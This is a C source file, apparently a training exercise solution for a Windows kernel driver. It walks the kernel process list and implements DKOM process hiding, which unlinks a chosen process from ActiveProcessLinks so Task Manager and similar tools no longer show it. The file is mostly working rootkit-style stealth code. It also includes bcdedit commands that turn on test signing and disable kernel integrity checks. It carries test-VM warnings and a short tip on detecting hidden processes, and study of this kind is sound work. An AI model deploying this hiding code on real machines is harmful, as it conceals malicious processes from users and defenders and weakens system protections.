/*
  Module 18 — Kernel Driver
  Exercise 04 Solution — Process List Walk & DKOM Process Hide
  =============================================================
  Two techniques demonstrated:

  PART A — listProcesses():
    Walks the kernel's ActiveProcessLinks doubly-linked list to enumerate
    every EPROCESS structure, printing PID + image name via DbgPrint.
    This is how rootkit-hunting tools compare the "true" kernel list against
    what Toolhelp32/NtQuerySystemInformation exposes to user mode.

  PART B — hideProcess(pid):
    Removes a target EPROCESS from the ActiveProcessLinks list (DKOM —
    Direct Kernel Object Manipulation). After the unlink, user-mode
    enumerators (Task Manager, Toolhelp32, Process Hacker) no longer see
    the process. The process itself keeps running perfectly.

  Offsets used (Windows 10/11 x64, build 19041+):
    UniqueProcessId    EPROCESS+0x440
    ActiveProcessLinks EPROCESS+0x448  (LIST_ENTRY)
    ImageFileName      EPROCESS+0x5A8  (15-char array, null-terminated)

  Build (WDK required):
    Add to a WDK kernel-mode driver project.
    Target VM must have test signing enabled:
      bcdedit /set testsigning on

  IMPORTANT: Run only in a dedicated test VM.
*/

#include <ntddk.h>
#include <wdm.h>

// ---------------------------------------------------------------------------
// Offsets for Windows 10/11 x64 (20H2 / 21H2 / 22H2 / 23H2)
// Use nt!_EPROCESS offsets from WinDbg `dt nt!_EPROCESS` to verify
// on your specific build before running.
// ---------------------------------------------------------------------------
#define OFFSET_UNIQUE_PROCESS_ID    0x440   // HANDLE / ULONG_PTR
#define OFFSET_ACTIVE_PROCESS_LINKS 0x448   // LIST_ENTRY (Flink/Blink)
#define OFFSET_IMAGE_FILE_NAME      0x5A8   // CHAR[15]

// ---------------------------------------------------------------------------
// Helper: read PID from raw EPROCESS pointer
// ---------------------------------------------------------------------------
static HANDLE getProcessId(PEPROCESS proc) {
    return *(HANDLE*)((PBYTE)proc + OFFSET_UNIQUE_PROCESS_ID);
}

// ---------------------------------------------------------------------------
// Helper: read image name from raw EPROCESS pointer
// The ImageFileName field is a 15-byte (CHAR) array, null-terminated.
// ---------------------------------------------------------------------------
static const char* getImageName(PEPROCESS proc) {
    return (const char*)((PBYTE)proc + OFFSET_IMAGE_FILE_NAME);
}

// ---------------------------------------------------------------------------
// listProcesses — PART A
// ---------------------------------------------------------------------------
// Walks ActiveProcessLinks starting from the SYSTEM process
// (PsInitialSystemProcess, PID 4) and prints every process visible in the
// kernel list via DbgPrint. View the output with DebugView or WinDbg.
//
// Algorithm:
//   head = &SYSTEM_EPROCESS->ActiveProcessLinks   (the sentinel)
//   cur  = head->Flink
//   while cur != head:
//       proc = CONTAINING_RECORD(cur, EPROCESS, ActiveProcessLinks)
//            = (PBYTE)cur - OFFSET_ACTIVE_PROCESS_LINKS
//       print PID + name
//       cur = cur->Flink
// ---------------------------------------------------------------------------
VOID listProcesses(void) {
    // PsInitialSystemProcess is an ntoskrnl export that points to the
    // SYSTEM process (PID 4). It is the starting point for the walk.
    PEPROCESS systemProcess = PsInitialSystemProcess;
    if (!systemProcess) {
        DbgPrint("[PLIST] PsInitialSystemProcess is NULL\n");
        return;
    }

    // The LIST_ENTRY at OFFSET_ACTIVE_PROCESS_LINKS inside the SYSTEM
    // EPROCESS serves as the list head (sentinel). Walking Flink from
    // here visits every process until we return to the sentinel.
    PLIST_ENTRY head = (PLIST_ENTRY)((PBYTE)systemProcess + OFFSET_ACTIVE_PROCESS_LINKS);
    PLIST_ENTRY cur  = head->Flink;

    ULONG count = 0;

    while (cur != head) {
        // Convert LIST_ENTRY pointer back to the enclosing EPROCESS.
        // Equivalent to CONTAINING_RECORD(cur, EPROCESS, ActiveProcessLinks).
        PEPROCESS proc = (PEPROCESS)((PBYTE)cur - OFFSET_ACTIVE_PROCESS_LINKS);

        DbgPrint("[PLIST] PID=%-6llu  %s\n",
                 (ULONG64)(ULONG_PTR)getProcessId(proc),
                 getImageName(proc));

        count++;
        cur = cur->Flink;

        // Safety guard: exit if list appears corrupt (cycle longer than
        // any realistic process count — avoids infinite loop on corrupt memory).
        if (count > 4096) {
            DbgPrint("[PLIST] Safety limit reached — list may be corrupt\n");
            break;
        }
    }

    DbgPrint("[PLIST] Total processes in kernel list: %lu\n", count);
}

// ---------------------------------------------------------------------------
// hideProcess — PART B (DKOM unlink)
// ---------------------------------------------------------------------------
// Removes the target EPROCESS from ActiveProcessLinks so that user-mode
// enumerators no longer see the process. The process continues to run.
//
// Flink/Blink surgery (standard doubly-linked list removal):
//
//     [prev] <--> [target] <--> [next]
//              becomes
//     [prev] <--> [next]
//
//   target->Blink->Flink = target->Flink   (prev's Flink skips target)
//   target->Flink->Blink = target->Blink   (next's Blink skips target)
//   target->Flink = target->Blink = target (self-loop — optional but tidy)
//
// NOTE: On modern Windows the kernel has integrity checks (PatchGuard / KPP)
// that periodically verify critical structures. DKOM of ActiveProcessLinks
// can trigger a BSOD (CRITICAL_STRUCTURE_CORRUPTION) on production builds.
// This technique works reliably only in a test VM with PatchGuard disabled
// (bcdedit /set {current} nointegritychecks on — HVCI-off, test-signing mode).
// ---------------------------------------------------------------------------
VOID hideProcess(ULONG_PTR pid) {
    // -----------------------------------------------------------------------
    // Step 1: Resolve EPROCESS for the target PID.
    // -----------------------------------------------------------------------
    PEPROCESS target = NULL;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &target);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[DKOM] PID %llu not found: %08X\n", (ULONG64)pid, status);
        return;
    }

    DbgPrint("[DKOM] Hiding PID=%llu (%s) at EPROCESS=%p\n",
             (ULONG64)pid, getImageName(target), target);

    // -----------------------------------------------------------------------
    // Step 2: Get the LIST_ENTRY inside this EPROCESS.
    // -----------------------------------------------------------------------
    PLIST_ENTRY entry = (PLIST_ENTRY)((PBYTE)target + OFFSET_ACTIVE_PROCESS_LINKS);

    // -----------------------------------------------------------------------
    // Step 3: Perform the unlink.
    //
    // On Windows 8+ the kernel sometimes uses RemoveEntryList which is
    // inline — any external call to the same entry is safe here as long as
    // IRQL <= APC_LEVEL and we are careful not to race with a list walk.
    // We raise to DISPATCH_LEVEL briefly with a spinlock in production code;
    // here we omit the lock for clarity (this is an educational exercise).
    // -----------------------------------------------------------------------
    PLIST_ENTRY prev = entry->Blink;  // process before target in the list
    PLIST_ENTRY next = entry->Flink;  // process after  target in the list

    // Bypass the target entry.
    prev->Flink = next;  // previous process now points forward to next
    next->Blink = prev;  // next process now points backward to previous

    // Self-loop the unlinked entry (optional but prevents dangling pointers
    // if something still holds a reference to this LIST_ENTRY).
    entry->Flink = entry;
    entry->Blink = entry;

    DbgPrint("[DKOM] Unlinked PID=%llu from ActiveProcessLinks\n", (ULONG64)pid);
    DbgPrint("[DKOM] Process is now invisible to user-mode enumeration.\n");
    DbgPrint("[DKOM] Verify: open Task Manager — PID %llu should be gone.\n", (ULONG64)pid);

    // -----------------------------------------------------------------------
    // Step 4: Release the reference from PsLookupProcessByProcessId.
    // -----------------------------------------------------------------------
    ObDereferenceObject(target);
}

// ---------------------------------------------------------------------------
// DriverUnload
// ---------------------------------------------------------------------------
VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrint("[ProcList] Unloaded\n");
}

// ---------------------------------------------------------------------------
// DriverEntry
// ---------------------------------------------------------------------------
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    DriverObject->DriverUnload = DriverUnload;

    DbgPrint("[ProcList] Loaded — walking kernel process list:\n");
    listProcesses();

    // To test the DKOM hide, replace 0 with a real PID you want to hide,
    // then load the driver and check Task Manager / Process Hacker.
    // Example: hideProcess(1234);
    //
    // To detect DKOM-hidden processes (blue-team exercise):
    //   Walk the kernel list AND brute-force PID scan (OpenProcess on every
    //   PID from 4 to 65535 in steps of 4). Processes that open successfully
    //   but are absent from the kernel list are DKOM-hidden.

    return STATUS_SUCCESS;
}
